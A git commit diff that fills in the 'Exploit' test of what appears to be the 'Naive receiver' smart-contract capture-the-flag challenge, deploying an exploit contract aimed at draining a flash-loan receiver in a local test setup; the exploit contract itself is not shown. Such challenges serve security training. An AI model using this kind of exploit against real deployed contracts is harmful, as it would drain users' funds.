884fe8715f7958dfbfe7e66618192c29d41000fd
astrolince <astro@astrolince.com>
2022-04-08 03:00:13 -0300

    naive receiver exploit

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -19,18 +19,22 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        await this.pool.connect(attacker);
+        // await this.pool.flashLoan(this.receiver.address, 0);
+        const ExploitFactory = await ethers.getContractFactory("NaiveReceiverExploit");
+        this.attacker = await ExploitFactory.deploy(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
